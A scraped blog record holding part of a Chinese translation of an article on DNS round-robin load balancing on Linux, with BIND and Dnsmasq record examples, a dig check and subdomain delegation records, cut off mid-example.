href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/vincent7\">v7</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/vincent7\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/2976e1383dc6fd216901213fcff13ae4.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            微博：@_v7__        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/vincent7\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/vincent7/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/vincent7/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 17</a> · <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/u/2135822193\"><i class=\"fa fa-weibo\"></i></a> <a title=\"个人微信：vince_yang\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/eb63456a872d5c2ffd8306369d8fe47503161e04.jpg"},{"url_object_id": "1d572c5a3d4363cbf04c9d85ab99bc4e", "title": ["在 Linux 上用 DNS 实现简单的负载均衡"], "url": "http://blog.jobbole.com/114157/", "create_date": "2018/06/25", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 0, "tags": "IT技术, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linux.com/learn/intro-to-linux/2018/3/simple-load-balancing-dns-linux\">Carla Shroder</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9777-1.html\">Linux中国/qhwdw</a>   </div><blockquote><p>DNS 轮询将多个服务器映射到同一个主机名，并没有为这里展示的魔法做更多的工作。</p></blockquote>\n<p>如果你的后端服务器是由多台服务器构成的，比如集群化或者镜像的 Web 或者文件服务器，通过负载均衡器提供了单一的入口点。业务繁忙的大型电商在高端负载均衡器上花费了大量的资金，用它来执行各种各样的任务：代理、缓存、状况检查、SSL 处理、可配置的优先级、流量整形等很多任务。</p>\n<p>但是你并不需要做那么多工作的负载均衡器。你需要的是一个跨服务器分发负载的简单方法，它能够提供故障切换，并且不太在意它是否高效和完美。DNS 轮询和使用轮询的子域委派是实现这个目标的两种简单方法。</p>\n<p>DNS 轮询是将多台服务器映射到同一个主机名上，当用户访问 <code>foo.example.com</code> 时多台服务器都可用于处理它们的请求，使用的就是这种方式。</p>\n<p>当你有多个子域或者你的服务器在地理上比较分散时，使用轮询的子域委派就比较有用。你有一个主域名服务器，而子域有它们自己的域名服务器。你的主域名服务器将所有的到子域的请求指向到它们自己的域名服务器上。这将提升响应时间，因为 DNS 协议会自动查找最快的链路。</p>\n<h3 id=\"toc_1\">DNS 轮询</h3>\n<p>轮询和旅鸫鸟robins没有任何关系，据我相熟的图书管理员说，它最初是一个法语短语，<em>ruban rond</em>、或者 <em>round ribbon</em>。很久以前，法国政府官员以不分级的圆形、波浪线、或者直线形状来在请愿书上签字，以盖住原来的发起人。</p>\n<p>DNS 轮询也是不分级的，简单配置一个服务器列表，然后将请求转到每个服务器上。它并不做真正的负载均衡，因为它根本就不测量负载，也没有状况检查，因此如果一个服务器宕机，请求仍然会发送到那个宕机的服务器上。它的优点就是简单。如果你有一个小的文件或者 Web 服务器集群，想通过一个简单的方法在它们之间分散负载，那么 DNS 轮询很适合你。</p>\n<p>你所做的全部配置就是创建多条 A 或者 AAAA 记录，映射多台服务器到单个的主机名。这个 BIND 示例同时使用了 IPv4 和 IPv6 私有地址类：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6259dcd68ed112960216\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfileserv.example.com. IN A 172.16.10.10\r\nfileserv.example.com. IN A 172.16.10.11\r\nfileserv.example.com. IN A 172.16.10.12\r\n\r\nfileserv.example.com. IN AAAA fd02:faea:f561:8fa0:1::10\r\nfileserv.example.com. IN AAAA fd02:faea:f561:8fa0:1::11\r\nfileserv.example.com. IN AAAA fd02:faea:f561:8fa0:1::12\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68ed112960216-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd68ed112960216-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68ed112960216-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd68ed112960216-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68ed112960216-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd68ed112960216-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68ed112960216-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd68ed112960216-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6259dcd68ed112960216-1\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.10.10</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd68ed112960216-2\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.10.11</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd68ed112960216-3\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.10.12</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd68ed112960216-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b6259dcd68ed112960216-5\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">10</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd68ed112960216-6\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">11</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd68ed112960216-7\"><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">12</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd68ed112960216-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p>Dnsmasq 在 <code>/etc/hosts</code> 文件中保存 A 和 AAAA 记录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6259dcd68f5718467077\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n172.16.1.10 fileserv fileserv.example.com\r\n172.16.1.11 fileserv fileserv.example.com\r\n172.16.1.12 fileserv fileserv.example.com\r\nfd02:faea:f561:8fa0:1::10 fileserv fileserv.example.com\r\nfd02:faea:f561:8fa0:1::11 fileserv fileserv.example.com\r\nfd02:faea:f561:8fa0:1::12 fileserv fileserv.example.com\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68f5718467077-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd68f5718467077-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68f5718467077-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd68f5718467077-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68f5718467077-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd68f5718467077-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68f5718467077-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6259dcd68f5718467077-1\"><span class=\"crayon-cn\">172.16.1.10</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd68f5718467077-2\"><span class=\"crayon-cn\">172.16.1.11</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd68f5718467077-3\"><span class=\"crayon-cn\">172.16.1.12</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd68f5718467077-4\"><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd68f5718467077-5\"><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd68f5718467077-6\"><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">12</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-v\">fileserv</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd68f5718467077-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0018 seconds] -->\r\n<p>请注意这些示例都是很简化的，解析完全合格域名有多种方法，因此，关于如何配置 DNS 请自行学习。</p>\n<p>使用 <code>dig</code> 命令去检查你的配置能否按预期工作。将 <code>ns.example.com</code> 替换为你的域名服务器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6259dcd68fa389582313\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ dig @ns.example.com fileserv A fileserv AAA\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68fa389582313-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd68fa389582313-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6259dcd68fa389582313-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">dig</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">ns</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com </span><span class=\"crayon-i\">fileserv</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fileserv </span><span class=\"crayon-i\">AAA</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd68fa389582313-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>它将同时显示出 IPv4 和 IPv6 的轮询记录。</p>\n<h3 id=\"toc_2\">子域委派和轮询</h3>\n<p>子域委派结合轮询要做的配置会更多，但是这样有一些好处。当你有多个子域或者地理位置比较分散的服务器时，就应该去使用它。它的响应时间更快，并且宕机的服务器不会去响应，因此客户端不会因为等待回复而被挂住。一个短的 TTL，比如 60 秒，就能帮你做到。</p>\n<p>这种方法需要多台域名服务器。在最简化的场景中，你需要一台主域名服务器和两个子域，每个子域都有它们自己的域名服务器。在子域服务器上配置你的轮询记录，然后在你的主域名服务器上配置委派。</p>\n<p>在主域名服务器上的 BIND 中，你至少需要两个额外的配置，一个区声明以及在区数据文件中的 A/AAAA 记录。主域名服务器中的委派应该像如下的内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6259dcd68fe760265498\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nns1.sub.example.com. IN A 172.16.1.20\r\nns1.sub.example.com. IN AAAA fd02:faea:f561:8fa0:1::20\r\nns2.sub.example.com. IN A 172.16.1.21\r\nns2.sub.example.com. IN AAA fd02:faea:f561:8fa0:1::21\r\n\r\nsub.example.com. IN NS ns1.sub.example.com.\r\nsub.example.com. IN NS ns2.sub.example.com.\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68fe760265498-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd68fe760265498-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68fe760265498-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd68fe760265498-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68fe760265498-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd68fe760265498-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd68fe760265498-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd68fe760265498-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6259dcd68fe760265498-1\"><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.1.20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd68fe760265498-2\"><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">20</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd68fe760265498-3\"><span class=\"crayon-v\">ns2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.16.1.21</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd68fe760265498-4\"><span class=\"crayon-v\">ns2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAA </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">21</span></div><div class=\"crayon-line\" 